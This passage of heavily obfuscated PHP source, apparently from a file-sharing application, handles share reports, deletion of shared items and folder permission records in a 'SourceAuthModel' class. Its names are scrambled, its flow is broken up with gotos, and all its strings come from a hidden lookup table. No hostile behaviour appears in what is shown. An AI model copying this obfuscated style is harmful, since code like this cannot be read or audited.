!= $dÍ»¢êÛƒ±[191]) { $AëÖ¶˜×òø = $this->_folderReport($cí¾½®Íáˆ); if (!$AëÖ¶˜×òø) { return; } show_json(LNG($dÍ»¢êÛƒ±[1821]) . $dÍ»¢êÛƒ±[1822] . $AëÖ¶˜×òø, !1); } $F²…ÓŞ»—§ = Model($dÍ»¢êÛƒ±[769])->fileInfoGet($F‚’åÌ®[$dÍ»¢êÛƒ±[84]][$dÍ»¢êÛƒ±[390]]); if (!$F²…ÓŞ»—§) { return; } goto f¶—º¥‡ß¬; bØ’³–ÄÆğ: } private function _folderReport($Eğ®¦¤„œò) { goto Aˆ§ò•ñ•; cßµáÊ—­¦: $AÓ›­šÕøÀ = array_to_keyvalue($Bî«¸Œ°£Ò, $fñ±ÚªåÒ¦[33], $fñ±ÚªåÒ¦[28]); $AÓ›­šÕøÀ[] = $C¬åˆ¬Ò é[$fñ±ÚªåÒ¦[28]]; return implode($fñ±ÚªåÒ¦[8], $AÓ›­šÕøÀ); goto C‘Îœã–Ş˜; f±¬Ö”ÑÓ“: if (!$cµÅŞôÖÌ±) { return !1; } $cµÅŞôÖÌ± = array_to_keyvalue($cµÅŞôÖÌ±, $fñ±ÚªåÒ¦[33], $fñ±ÚªåÒ¦[441]); $E¯®Õä¹’‘ = $fñ±ÚªåÒ¦[47] . $Eğ®¦¤„œò . $fñ±ÚªåÒ¦[47]; goto b¥–ƒÜê; b¥–ƒÜê: $FÙÍòĞÉ÷¶ = array($fñ±ÚªåÒ¦[441] => array($fñ±ÚªåÒ¦[7], $cµÅŞôÖÌ±), $fñ±ÚªåÒ¦[481] => array($fñ±ÚªåÒ¦[378], "\x25{$E¯®Õä¹’‘}\45"), $fñ±ÚªåÒ¦[417] => 0); $C¬åˆ¬Ò é = Model($fñ±ÚªåÒ¦[769])->where($FÙÍòĞÉ÷¶)->field($fñ±ÚªåÒ¦[1825])->find(); if (!$C¬åˆ¬Ò é) { return !1; } goto CĞ›Ê…šÀ; Aˆ§ò•ñ•: $fñ±ÚªåÒ¦ =& $_SERVER[µ…]; $FÙÍòĞÉ÷¶ = array($fñ±ÚªåÒ¦[441] => array($fñ±ÚªåÒ¦[947], 0), $fñ±ÚªåÒ¦[704] => 3); $cµÅŞôÖÌ± = Model($fñ±ÚªåÒ¦[1824])->where($FÙÍòĞÉ÷¶)->field($fñ±ÚªåÒ¦[441])->select(); goto f±¬Ö”ÑÓ“; CĞ›Ê…šÀ: $bÈ™“‚®Â = substr($C¬åˆ¬Ò é[$fñ±ÚªåÒ¦[481]], strpos($C¬åˆ¬Ò é[$fñ±ÚªåÒ¦[481]], $E¯®Õä¹’‘)); $FÙÍòĞÉ÷¶ = array($fñ±ÚªåÒ¦[390] => array($fñ±ÚªåÒ¦[7], trim($bÈ™“‚®Â, $fñ±ÚªåÒ¦[47]))); $Bî«¸Œ°£Ò = Model($fñ±ÚªåÒ¦[769])->where($FÙÍòĞÉ÷¶)->field($fñ±ÚªåÒ¦[28])->select(); goto cßµáÊ—­¦; C‘Îœã–Ş˜: } protected function remove($bÉÛ½Êù®ƒ) { goto eÂ™®·ÚÎ‘; eÂ™®·ÚÎ‘: $D‹¼®‰®Ë =& $_SERVER[µ…]; if (is_array($bÉÛ½Êù®ƒ)) { $bÉÛ½Êù®ƒ = array($D‹¼®‰®Ë[7], $bÉÛ½Êù®ƒ); } $aø±ğ«¶¤‡ = array($D‹¼®‰®Ë[462] => $bÉÛ½Êù®ƒ); goto f´ÁÍ½ğä; E‘ªËÉù: for ($Eœè·é‚ºô = 0; $Eœè·é‚ºô < count($c¸ÃàùÇ—ß); $Eœè·é‚ºô++) { $fÍÙ‡¾“†¶ = $this->getInfo($c¸ÃàùÇ—ß[$Eœè·é‚ºô]); if ($fÍÙ‡¾“†¶[$D‹¼®‰®Ë[469]] == $D‹¼®‰®Ë[86]) { Model($D‹¼®‰®Ë[528])->eventShare($fÍÙ‡¾“†¶[$D‹¼®‰®Ë[390]], $D‹¼®‰®Ë[1814]); } if ($fÍÙ‡¾“†¶[$D‹¼®‰®Ë[467]] == $D‹¼®‰®Ë[86]) { Model($D‹¼®‰®Ë[528])->eventShare($fÍÙ‡¾“†¶[$D‹¼®‰®Ë[390]], $D‹¼®‰®Ë[1813]); } } return $f–İ®°ßÒ; goto dğ³¹‘œÃ; f´ÁÍ½ğä: $f–İ®°ßÒ = $this->where($aø±ğ«¶¤‡)->delete(); if ($f–İ®°ßÒ) { Model($D‹¼®‰®Ë[559])->where(array($D‹¼®‰®Ë[462] => $bÉÛ½Êù®ƒ))->delete(); } $c¸ÃàùÇ—ß = is_array($bÉÛ½Êù®ƒ) ? $bÉÛ½Êù®ƒ[1] : array($bÉÛ½Êù®ƒ); goto E‘ªËÉù; dğ³¹‘œÃ: } protected function removeBySource($C¥£•¨šå‘) { goto c„Ş‡õ¯ñ; c„Ş‡õ¯ñ: $f°’¸¨ö‰ =& $_SERVER[µ…]; $a“›•„ÀÎ® = array($f°’¸¨ö‰[404] => array($f°’¸¨ö‰[405], $C¥£•¨šå‘)); $AùïøÜĞ“± = $this->field($f°’¸¨ö‰[462])->where($a“›•„ÀÎ®)->select(); goto D¦ÛœÈ™ã; D¦ÛœÈ™ã: $AùïøÜĞ“± = array_to_keyvalue($AùïøÜĞ“±, $f°’¸¨ö‰[33], $f°’¸¨ö‰[462]); if (!$AùïøÜĞ“±) { return; } $a“›•„ÀÎ® = array($f°’¸¨ö‰[461] => array($f°’¸¨ö‰[405], $AùïøÜĞ“±)); goto FğàÔ¯ö¤; FğàÔ¯ö¤: $this->where($a“›•„ÀÎ®)->delete(); Model($f°’¸¨ö‰[559])->where($a“›•„ÀÎ®)->delete(); goto a§”½ÛÕ¬; a§”½ÛÕ¬: } public function listAll($cªó±µ¦™§) { goto e…ƒªíæ™; e…ƒªíæ™: $AÅòÍÚï±ø =& $_SERVER[µ…]; $Eå»»êÔ©† = array(); if ($cªó±µ¦™§[$AÅòÍÚï±ø[1506]]) { $Eå»»êÔ©†[$AÅòÍÚï±ø[1506]] = $cªó±µ¦™§[$AÅòÍÚï±ø[1506]]; } goto cİ£Ø­˜µ; b“—İÂØö†: return $D¶ŒéÙ‡”Á; goto d…„é½¤õ¶; cİ£Ø­˜µ: if ($cªó±µ¦™§[$AÅòÍÚï±ø[717]]) { $C¡ªÜéÈ†ª = $cªó±µ¦™§[$AÅòÍÚï±ø[470]] ? $cªó±µ¦™§[$AÅòÍÚï±ø[470]] : strtotime(date($AÅòÍÚï±ø[1826])); $Eå»»êÔ©†[$AÅòÍÚï±ø[192]] = array($AÅòÍÚï±ø[329], array($cªó±µ¦™§[$AÅòÍÚï±ø[717]], $C¡ªÜéÈ†ª)); } if ($cªó±µ¦™§[$AÅòÍÚï±ø[29]]) { $Eå»»êÔ©†[$cªó±µ¦™§[$AÅòÍÚï±ø[29]]] = 1; } else { $Eå»»êÔ©†[] = array($AÅòÍÚï±ø[467] => array($AÅòÍÚï±ø[947], 0), $AÅòÍÚï±ø[469] => array($AÅòÍÚï±ø[947], 0), $AÅòÍÚï±ø[1803] => $AÅòÍÚï±ø[1757]); } if ($cªó±µ¦™§[$AÅòÍÚï±ø[1753]]) { $Eå»»êÔ©†[] = array($AÅòÍÚï±ø[464] => $cªó±µ¦™§[$AÅòÍÚï±ø[1753]], $AÅòÍÚï±ø[1411] => array($AÅòÍÚï±ø[378], "\45{$cªó±µ¦™§[$AÅòÍÚï±ø[1753]]}\x25"), $AÅòÍÚï±ø[1803] => $AÅòÍÚï±ø[1757]); } goto e—ÔÏ¼Ï·Ø; e—ÔÏ¼Ï·Ø: $D¶ŒéÙ‡”Á = $this->_makeOrder()->where($Eå»»êÔ©†)->selectPage(20); if (empty($D¶ŒéÙ‡”Á[$AÅòÍÚï±ø[365]])) { return array(); } $this->_listDataApply($D¶ŒéÙ‡”Á[$AÅòÍÚï±ø[365]]); goto b“—İÂØö†; d…„é½¤õ¶: } public function listDataApply($D•ªĞêÅÁí) { $this->_listDataApply($D•ªĞêÅÁí); return $D•ªĞêÅÁí; } private function _listDataApply(&$e„£÷™ç¤) { goto F•ÌÖ†™¬; CóØŒ¤ÓĞ¹: $e‰‘„ŒÎ´í = array_to_keyvalue($e„£÷™ç¤, $F´áÁÙŠ‰[33], $F´áÁÙŠ‰[390]); $cÚ‘ÚÓñÒ³ = Model($F´áÁÙŠ‰[769])->sourceListInfo($e‰‘„ŒÎ´í, !0); foreach ($e„£÷™ç¤ as &$EŠ¥ÛÈâ è) { $fà§ãß¼Æ = $EŠ¥ÛÈâ è[$F´áÁÙŠ‰[1506]]; $EŠ¥ÛÈâ è[$F´áÁÙŠ‰[1827]] = $Eò‰Âíì™[$fà§ãß¼Æ] ? $Eò‰Âíì™[$fà§ãß¼Æ] : !1; $eÊÙ÷ó“  = $EŠ¥ÛÈâ è[$F´áÁÙŠ‰[390]]; $EŠ¥ÛÈâ è[$F´áÁÙŠ‰[84]] = $cÚ‘ÚÓñÒ³[$eÊÙ÷ó“ ] ? $cÚ‘ÚÓñÒ³[$eÊÙ÷ó“ ] : !1; } goto Bµ‡…³ Œ¯; Bµ‡…³ Œ¯: unset($EŠ¥ÛÈâ è); goto aÍº³×¯‚É; F•ÌÖ†™¬: $F´áÁÙŠ‰ =& $_SERVER[µ…]; $Cëï´êÓº† = array_to_keyvalue($e„£÷™ç¤, $F´áÁÙŠ‰[33], $F´áÁÙŠ‰[1506]); $Eò‰Âíì™ = Model($F´áÁÙŠ‰[501])->userListInfo(array_unique($Cëï´êÓº†)); goto CóØŒ¤ÓĞ¹; aÍº³×¯‚É: } private function _makeOrder($E«êåÛ…¥« = '') { goto E¨Ò»¨„µ; FĞï”†’¸«: $E¼ÖˆŸ‚æ— = Input::get($dŞàÂ¡™²Î[429], $dŞàÂ¡™²Î[7], $dŞàÂ¡™²Î[410], $d½¨¤Ëá›À); $cŠ„ÏâìÆÓ = Input::get($dŞàÂ¡™²Î[430], $dŞàÂ¡™²Î[7], $dŞàÂ¡™²Î[1828], array($dŞàÂ¡™²Î[1752], $dŞàÂ¡™²Î[424])); $cŠ„ÏâìÆÓ = $BÓÃóïŞ¦Ø[$cŠ„ÏâìÆÓ]; goto E†§æÕÉ¥Ø; E†§æÕÉ¥Ø: $E«êåÛ…¥« = $E«êåÛ…¥« . "{$E¼ÖˆŸ‚æ—}\x20{$cŠ„ÏâìÆÓ}"; return $this->order($E«êåÛ…¥«); goto Dñ¡Ü¾É¸î; E¨Ò»¨„µ: $dŞàÂ¡™²Î =& $_SERVER[µ…]; $d½¨¤Ëá›À = array($dŞàÂ¡™²Î[192], $dŞàÂ¡™²Î[470], $dŞàÂ¡™²Î[1816], $dŞàÂ¡™²Î[1817]); $BÓÃóïŞ¦Ø = array($dŞàÂ¡™²Î[422] => $dŞàÂ¡™²Î[423], $dŞàÂ¡™²Î[424] => $dŞàÂ¡™²Î[425]); goto FĞï”†’¸«; Dñ¡Ü¾É¸î: } public function reportAdd($DåÃ‰šŞ¢) { $DÑ½Ÿ£‘È =& $_SERVER[µ…]; $bÎÖÌëŸŒ = array($DÑ½Ÿ£‘È[462] => $DåÃ‰šŞ¢[$DÑ½Ÿ£‘È[462]], $DÑ½Ÿ£‘È[1506] => USER_ID); if (Model($DÑ½Ÿ£‘È[1824])->where($bÎÖÌëŸŒ)->find()) { return !1; } $eÄ÷„Ä£òÄ = array($DÑ½Ÿ£‘È[462] => $DåÃ‰šŞ¢[$DÑ½Ÿ£‘È[462]], $DÑ½Ÿ£‘È[1411] => $DåÃ‰šŞ¢[$DÑ½Ÿ£‘È[1411]], $DÑ½Ÿ£‘È[390] => $DåÃ‰šŞ¢[$DÑ½Ÿ£‘È[390]], $DÑ½Ÿ£‘È[441] => $DåÃ‰šŞ¢[$DÑ½Ÿ£‘È[441]], $DÑ½Ÿ£‘È[1506] => USER_ID, $DÑ½Ÿ£‘È[29] => $DåÃ‰šŞ¢[$DÑ½Ÿ£‘È[29]], $DÑ½Ÿ£‘È[425] => $DåÃ‰šŞ¢[$DÑ½Ÿ£‘È[425]]); return Model($DÑ½Ÿ£‘È[1824])->add($eÄ÷„Ä£òÄ); } public function reportList($eÉ½˜Éø»’) { goto D¥›ƒ¯îØ; D¥›ƒ¯îØ: $Eâ ŠíÀ³© =& $_SERVER[µ…]; $Eö‚¿¢²â‡ = array(); if ($eÉ½˜Éø»’[$Eâ ŠíÀ³©[717]]) { $e¶ñ”Ëºõ = $eÉ½˜Éø»’[$Eâ ŠíÀ³©[470]] ? $eÉ½˜Éø»’[$Eâ ŠíÀ³©[470]] : strtotime(date($Eâ ŠíÀ³©[1826])); $Eö‚¿¢²â‡[$Eâ ŠíÀ³©[192]] = array($Eâ ŠíÀ³©[329], array($eÉ½˜Éø»’[$Eâ ŠíÀ³©[717]], $e¶ñ”Ëºõ)); } goto f²ŞÎÍˆ·™; C…»·Ö‘Ì: if (empty($fõ´¦Š³[$Eâ ŠíÀ³©[365]])) { return array(); } $this->_listDataApply($fõ´¦Š³[$Eâ ŠíÀ³©[365]]); return $fõ´¦Š³; goto Bƒà˜¯àÛ; f²ŞÎÍˆ·™: if (isset($eÉ½˜Éø»’[$Eâ ŠíÀ³©[29]]) && in_array($eÉ½˜Éø»’[$Eâ ŠíÀ³©[29]], array($Eâ ŠíÀ³©[86], $Eâ ŠíÀ³©[1829], $Eâ ŠíÀ³©[1830], $Eâ ŠíÀ³©[1831], $Eâ ŠíÀ³©[1832]))) { $Eö‚¿¢²â‡[$Eâ ŠíÀ³©[29]] = $eÉ½˜Éø»’[$Eâ ŠíÀ³©[29]]; } if (isset($eÉ½˜Éø»’[$Eâ ŠíÀ³©[704]]) && in_array($eÉ½˜Éø»’[$Eâ ŠíÀ³©[704]], array($Eâ ŠíÀ³©[491], $Eâ ŠíÀ³©[86], $Eâ ŠíÀ³©[1829], $Eâ ŠíÀ³©[1830]))) { $Eö‚¿¢²â‡[$Eâ ŠíÀ³©[704]] = $eÉ½˜Éø»’[$Eâ ŠíÀ³©[704]]; } $d³Ë›ÇµÂâ = Input::get($Eâ ŠíÀ³©[430], $Eâ ŠíÀ³©[7], $Eâ ŠíÀ³©[1828], array($Eâ ŠíÀ³©[1752], $Eâ ŠíÀ³©[424])); goto A¥İ®âŒÊ; A¥İ®âŒÊ: $EƒëèÆ©°Á = array($Eâ ŠíÀ³©[422] => $Eâ ŠíÀ³©[423], $Eâ ŠíÀ³©[424] => $Eâ ŠíÀ³©[425]); $c¡Ç¼”»º˜ = $Eâ ŠíÀ³©[1833] . $EƒëèÆ©°Á[$d³Ë›ÇµÂâ]; $fõ´¦Š³ = Model($Eâ ŠíÀ³©[1824])->where($Eö‚¿¢²â‡)->order($c¡Ç¼”»º˜)->selectPage(20); goto C…»·Ö‘Ì; Bƒà˜¯àÛ: } public function reportStatus($aãÎİ„åš) { goto aÅÚ“’Íõ; B…‡ââ…ÙŠ: $cŠ‘Û²ì™ = Model($A÷™Ğ×ºÖù[1824])->where($CŞ¡ôÚøÑ¢)->save($cé‚¸óñ‚Ğ); if ($aãÎİ„åš[$A÷™Ğ×ºÖù[704]] == $A÷™Ğ×ºÖù[1829]) { if ($eò…ùà‚ç[$A÷™Ğ×ºÖù[441]] != $A÷™Ğ×ºÖù[491] && $this->shareFileMeta($eò…ùà‚ç[$A÷™Ğ×ºÖù[441]])) { $this->shareFileMeta($eò…ùà‚ç[$A÷™Ğ×ºÖù[441]], 0); } $this->remove($eò…ùà‚ç[$A÷™Ğ×ºÖù[462]]); return !0; } if ($cŠ‘Û²ì™ && $aãÎİ„åš[$A÷™Ğ×ºÖù[704]] == $A÷™Ğ×ºÖù[1830]) { $C‰Üª“Ô± = $cé‚¸óñ‚Ğ[$A÷™Ğ×ºÖù[704]] == $A÷™Ğ×ºÖù[1830] ? 1 : 0; $this->shareFileMeta($eò…ùà‚ç[$A÷™Ğ×ºÖù[441]], $C‰Üª“Ô±); $this->removeByFile($eò…ùà‚ç[$A÷™Ğ×ºÖù[441]]); } goto béÓÍÛ‹ìĞ; fšÎìƒ•”¼: if (!$eò…ùà‚ç) { return !1; } $cé‚¸óñ‚Ğ = array($A÷™Ğ×ºÖù[704] => $aãÎİ„åš[$A÷™Ğ×ºÖù[704]]); if ($aãÎİ„åš[$A÷™Ğ×ºÖù[704]] == $A÷™Ğ×ºÖù[1830] && $eò…ùà‚ç[$A÷™Ğ×ºÖù[704]] == $A÷™Ğ×ºÖù[1830]) { $cé‚¸óñ‚Ğ[$A÷™Ğ×ºÖù[704]] = 0; } goto B…‡ââ…ÙŠ; béÓÍÛ‹ìĞ: return $cŠ‘Û²ì™; goto bÛ™É²ÖÖ³; aÅÚ“’Íõ: $A÷™Ğ×ºÖù =& $_SERVER[µ…]; $CŞ¡ôÚøÑ¢ = array($A÷™Ğ×ºÖù[388] => $aãÎİ„åš[$A÷™Ğ×ºÖù[388]]); $eò…ùà‚ç = Model($A÷™Ğ×ºÖù[1824])->where($CŞ¡ôÚøÑ¢)->field($A÷™Ğ×ºÖù[1834])->find(); goto fšÎìƒ•”¼; bÛ™É²ÖÖ³: } private function removeByFile($Dò„æ¹™å) { goto Dí¹Ùçø¥; E†å‡°î‹È: $B÷Ò¦¡ßµˆ = array($DÃ‹”Úµ‹£[390] => array($DÃ‹”Úµ‹£[7], $BÄ”½Áô˜§), $DÃ‹”Úµ‹£[467] => 1); $E‚À×¬óÇ¼ = Model($DÃ‹”Úµ‹£[1646])->where($B÷Ò¦¡ßµˆ)->field($DÃ‹”Úµ‹£[462])->select(); if (empty($E‚À×¬óÇ¼)) { return; } goto Díø´¼ò†; Díø´¼ò†: $B•Œµ×æã½ = array_to_keyvalue($E‚À×¬óÇ¼, $DÃ‹”Úµ‹£[33], $DÃ‹”Úµ‹£[462]); $this->remove($B•Œµ×æã½); goto EªÛù‡šğè; Dí¹Ùçø¥: $DÃ‹”Úµ‹£ =& $_SERVER[µ…]; $E‚À×¬óÇ¼ = Model($DÃ‹”Úµ‹£[769])->where(array($DÃ‹”Úµ‹£[441] => $Dò„æ¹™å))->field($DÃ‹”Úµ‹£[390])->select(); $BÄ”½Áô˜§ = array_to_keyvalue($E‚À×¬óÇ¼, $DÃ‹”Úµ‹£[33], $DÃ‹”Úµ‹£[390]); goto E†å‡°î‹È; EªÛù‡šğè: } private function shareFileMeta($a¶ê¤²—©, $aÚÚö·°Ô† = null) { $aŸêøÄ½à =& $_SERVER[µ…]; $Cø¨ßƒ›“ = array($aŸêøÄ½à[441] => $a¶ê¤²—©, $aŸêøÄ½à[92] => $aŸêøÄ½à[1835]); if (is_null($aÚÚö·°Ô†)) { return Model($aŸêøÄ½à[1836])->where($Cø¨ßƒ›“)->find(); } $Cø¨ßƒ›“[$aŸêøÄ½à[370]] = $aÚÚö·°Ô†; Model($aŸêøÄ½à[1836])->add($Cø¨ßƒ›“, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\162\x63\145\x5f\141\165\164\150"; public function getAuth($C‹¢ÅŒ¢É) { goto céŞ¯İ¬¶; f›æ°Æ¬—: $C‘øôÑ®”Â = array(); $cÏ„ŸÂñ¿å = 2 << 25; foreach ($d„õöòğ³ as $D¸ê»Õ³Í®) { goto E¾¾”œÒ¬¤; A«Úî§”¸£: $Böë‘Œº½ñ = 0; if ($D¸ê»Õ³Í®[$eôÉâµêÆ[398]] == SourceModel::TYPE_GROUP) { $Böë‘Œº½ñ = $cÏ„ŸÂñ¿å * 2; } if ($D¸ê»Õ³Í®[$eôÉâµêÆ[398]] == SourceModel::TYPE_USER) { $Böë‘Œº½ñ = $cÏ„ŸÂñ¿å; } goto f‚›• ´‘«; E¾¾”œÒ¬¤: $fëµÎÔ¨âª = Model($eôÉâµêÆ[1837])->listData($D¸ê»Õ³Í®[$eôÉâµêÆ[1765]]); if (!$fëµÎÔ¨âª) { continue; } $eÌ°ÍÚØ¬[] = $D¸ê»Õ³Í®; goto A«Úî§”¸£; f‚›• ´‘«: if ($D¸ê»Õ³Í®[$eôÉâµêÆ[398]] == SourceModel::TYPE_USER && $D¸ê»Õ³Í®[$eôÉâµêÆ[478]] == $eôÉâµêÆ[491]) { $Böë‘Œº½ñ = 0; } $C‘øôÑ®”Â[] = $fëµÎÔ¨âª[$eôÉâµêÆ[400]] + $Böë‘Œº½ñ; goto fò¼¢á×; fò¼¢á×: } goto d¢ÓÚƒ‚´; céŞ¯İ¬¶: $eôÉâµêÆ =& $_SERVER[µ…]; $d„õöòğ³ = $this->sourceAuthSelect($C‹¢ÅŒ¢É); $eÌ°ÍÚØ¬ = array(); goto f›æ°Æ¬—; d¢ÓÚƒ‚´: array_multisort($C‘øôÑ®”Â, SORT_DESC, $eÌ°ÍÚØ¬); return $eÌ°ÍÚØ¬; goto c‚óòİ„ßè; c‚óòİ„ßè: } public function sourceAuthSelect($e¾ÌÕºË‘©) { goto Dôàâ×²•²; cÍ‰†•´âğ: if (count($e¨ŠÁ©·) == count($e¾ÌÕºË‘©)) { return $aÆÁ“å½µã ? $e¨ŠÁ©·[$e¾ÌÕºË‘©[0]] : $e¨ŠÁ©·; } $fÃõ¤‹ÂÕ… = $B“ç ‹ËÁö[1838]; $fï‰îíá´Ó = array($B“ç ‹ËÁö[390] => array($B“ç ‹ËÁö[7], $e¾ÌÕºË‘©)); goto dŸÛ¶ÛÄ¾†; eéœãîóŠ: if ($aÆÁ“å½µã) { return $aòÃí¡ˆ¶„; } return $Aá¹ÁÕ»õ; goto f‘˜¿éøÑÁ; A‹Ùâí²ÙÄ: if ($aÆÁ“å½µã) { $e¾ÌÕºË‘© = array($e¾ÌÕºË‘©); } $e¨ŠÁ©· = array(); foreach ($e¾ÌÕºË‘© as $d‘‰¾›…¹á) { if (isset($Få¨‰Û¼ÒØ[$d‘‰¾›…¹á])) { $e¨ŠÁ©·[$d‘‰¾›…¹á] = $Få¨‰Û¼ÒØ[$d‘‰¾›…¹á]; } } goto cÍ‰†•´âğ; Dôàâ×²•²: $B“ç ‹ËÁö =& $_SERVER[µ…]; static $Få¨‰Û¼ÒØ = array(); $aÆÁ“å½µã = is_array($e¾ÌÕºË‘©) ? !1 : !0; goto A‹Ùâí²ÙÄ; dŸÛ¶ÛÄ¾†: $aòÃí¡ˆ¶„ = $this->field($fÃõ¤‹ÂÕ…)->order($B“ç ‹ËÁö[388])->where($fï‰îíá´Ó)->select(); $Aá¹ÁÕ»õ = array_to_keyvalue_group($aòÃí¡ˆ¶„, $B“ç ‹ËÁö[390]); foreach ($e¾ÌÕºË‘© as $d‘‰¾›…¹á) { $Få¨‰Û¼ÒØ[$d‘‰¾›…¹á] = $Aá¹ÁÕ»õ[$d‘‰¾›…¹á] ? $Aá¹ÁÕ»õ[$d‘‰¾›…¹á] : array(); } goto eéœãîóŠ; f‘˜¿éøÑÁ: } public function setAuth($Bäó›¢ö§Ò, $DŸ–µôÁÎ¾) { goto D¼µÛöÆó; c¤¢·â©Ä©: if ($fÃ†Šˆ÷ö  != $cêÙ¡òåÉ) { $Dˆ·ìÉ¤·¥ = array($fŒñœ½èø·[1669] => $fÃ†Šˆ÷ö ); $e™Ôá»Ó•³ = Model($fŒñœ½èø·[1751])->field($fŒñœ½èø·[1506])->where($Dˆ·ìÉ¤·¥)->select(); $e™Ôá»Ó•³ = array_to_keyvalue($e™Ôá»Ó•³, $fŒñœ½èø·[33], $fŒñœ½èø·[1506]); } $Aª¢Šãİîö = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $e¸™ì‡µ = array(); goto cµöè„Ë¡á; F¬¸ÍÆ´çƒ: if ($Fæ›œ†¯­í[$fŒñœ½èø·[398]] != SourceModel::TYPE_GROUP) { return !1; } $cêÙ¡òåÉ = 1; $fÃ†Šˆ÷ö  = $Fæ›œ†¯­í[$fŒñœ½èø·[478]]; goto c¤¢·â©Ä©; C×Ü†¢”İ: return !0; goto E×ˆÁßê÷´; D¼µÛöÆó: $fŒñœ½èø· =& $_SERVER[µ…]; $Fæ›œ†¯­í = Model($fŒñœ½èø·[1181])->sourceInfo($Bäó›¢ö§Ò); if (!$Fæ›œ†¯­í) { return !1; } goto F¬¸ÍÆ´çƒ; cµöè„Ë¡á: foreach ($DŸ–µôÁÎ¾ as $fõ¶§ªÀ¸) { if (!in_array($fõ¶§ªÀ¸[$fŒñœ½èø·[398]], $Aª¢Šãİîö)) { show_json(LNG($fŒñœ½èø·[1839]), !1); } if ($fÃ†Šˆ÷ö  != $cêÙ¡òåÉ) { if ($fõ¶§ªÀ¸[$fŒñœ½èø·[398]] == SourceModel::TYPE_GROUP) { } if ($fõ¶§ªÀ¸[$fŒñœ½èø·[478]] != 0 && !in_array($fõ¶§ªÀ¸[$fŒñœ½èø·[478]], $e™Ôá»Ó•³)) { } } if ($fõ¶§ªÀ¸[$fŒñœ½èø·[478]] == 0) { $fõ¶§ªÀ¸[$fŒñœ½èø·[398]] = SourceModel::TYPE_USER; } $e¸™ì‡µ[] = array($fŒñœ½èø·[390] => $Bäó›¢ö§Ò, $fŒñœ½èø·[398] => intval($fõ¶§ªÀ¸[$fŒñœ½èø·[398]]), $fŒñœ½èø·[478] => intval($fõ¶§ªÀ¸[$fŒñœ½èø·[478]]), $fŒñœ½èø·[1765] => intval($fõ¶§ªÀ¸[$fŒñœ½èø·[1765]]) ? intval($fõ¶§ªÀ¸[$fŒñœ½èø·[1765]]) : 0, $fŒñœ½èø·[1819] => intval($fõ¶§ªÀ¸[$fŒñœ½èø·[1819]]) ? intval($fõ¶§ªÀ¸[$fŒñœ½èø·[1819]]) : -1); } $this->where(array($fŒñœ½èø·[404] => $Bäó›¢ö§Ò))->delete(); $this->addAll($e¸™ì‡µ); goto C×Ü†¢”İ; E×ˆÁßê÷´: } public function authClear($B¡Ğ†è‡Øº) { $f®öµ–‚ÕÙ =& $_SERVER[µ…]; $Bóï²æ„î = Model($f®öµ–‚ÕÙ[1181])->sourceInfo($B¡Ğ†è‡Øº); $bëâ»©öÖö = array($B¡Ğ†è‡Øº); if ($Bóï²æ„î[$f®öµ–‚ÕÙ[397]] == $f®öµ–‚ÕÙ[86]) { $b¡ßò¸‰‹œ = array($f®öµ–‚ÕÙ[548] => array($f®öµ–‚ÕÙ[507], $Bóï²æ„î[$f®öµ–‚ÕÙ[481]] . $B¡Ğ†è‡Øº . $f®öµ–‚ÕÙ[508])); $bëâ»©öÖö = Model($f®öµ–‚ÕÙ[1181])->field($f®öµ–‚ÕÙ[404])->where($b¡ßò¸‰‹œ)->getField($f®öµ–‚ÕÙ[390], !0); $bëâ»©öÖö[] = $B¡Ğ†è‡Øº; } $this->where(array($f®öµ–‚ÕÙ[404] => array($f®öµ–‚ÕÙ[405], $bëâ»©öÖö)))->delete(); return !0; } public function getAllChildren($f–íŞ¡†Æœ) { goto EÃ²¿ßÈ±‹; EÃ²¿ßÈ±‹: $eòœâÅ¼Ù­ =& $_SERVER[µ…]; $c¹‹è–ë¡È = Model($eòœâÅ¼Ù­[1181])->sourceInfo($f–íŞ¡†Æœ); if ($c¹‹è–ë¡È[$eòœâÅ¼Ù­[397]] != $eòœâÅ¼Ù­[86]) { return $this->sourceListAuth(array($f–íŞ¡†Æœ)); } goto a®Û„´‚î¾; aâÑÄƒ¦•ƒ: if (!$BÜ¾õ·¾Ãñ) { return array(); } $Cõ¶Á°¯½Ì = $eòœâÅ¼Ù­[1840]; $bÖ’´ôŞïƒ = array($eòœâÅ¼Ù­[390] => array($eòœâÅ¼Ù­[7], $BÜ¾õ·¾Ãñ), $eòœâÅ¼Ù­[417] => $eòœâÅ¼Ù­[491]); goto e Şçá„èÑ; a®Û„´‚î¾: if ($c¹‹è–ë¡È[$eòœâÅ¼Ù­[398]] != SourceModel::TYPE_GROUP) { return array(); } $a«•Øéó = 1; $CÏˆ˜‰£Î± = array($f–íŞ¡†Æœ); goto Fîóµ”Í‹; fµäá‚ÌšÃ: return $this->sourceListAuth($fŠ‚â§“Ÿù); goto Fâõ©ÂÎ®Ğ; Fîóµ”Í‹: if ($c¹‹è–ë¡È[$eòœâÅ¼Ù­[472]] == $eòœâÅ¼Ù­[491] && $c¹‹è–ë¡È[$eòœâÅ¼Ù­[478]] != $a«•Øéó) { $CÏˆ˜‰£Î± = $this->groupChidldAllRootSource($c¹‹è–ë¡È[$eòœâÅ¼Ù­[478]]); } $BÜ¾õ·¾Ãñ = $this->field($eòœâÅ¼Ù­[390])->group($eòœâÅ¼Ù­[390])->select(); $BÜ¾õ·¾Ãñ = array_to_keyvalue($BÜ¾õ·¾Ãñ, $eòœâÅ¼Ù­[33], $eòœâÅ¼Ù­[390]); goto aâÑÄƒ¦•ƒ; e Şçá„èÑ: $E´Ê„„â©š = Model($eòœâÅ¼Ù­[769])->field($Cõ¶Á°¯½Ì)->where($bÖ’´ôŞïƒ)->select(); $fŠ‚â§“Ÿù = array($f–íŞ¡†Æœ); foreach ($E´Ê„„â©š as $bƒÆ‘ŒšÏÈ) { foreach ($CÏˆ˜‰£Î± as $A”¢ÒâšìÇ) { $EÊ”ÜŒ¢š÷ = $eòœâÅ¼Ù­[47] . $A”¢ÒâšìÇ . $eòœâÅ¼Ù­[47]; $aÄï¼Û¢Ÿ­ = $bƒÆ‘ŒšÏÈ[$eòœâÅ¼Ù­[481]] . $bƒÆ‘ŒšÏÈ[$eòœâÅ¼Ù­[390]] . $eòœâÅ¼Ù­[47]; if (strstr($aÄï¼Û¢Ÿ­, $EÊ”ÜŒ¢š÷)) { $fŠ‚â§“Ÿù[] = $bƒÆ‘ŒšÏÈ[$eòœâÅ¼Ù­[390]]; break; } } } goto fµäá‚ÌšÃ; Fâõ©ÂÎ®Ğ: } private function sourceListAuth($AôáÜôß‰¬) { goto E³¥¯½ÈÌ; 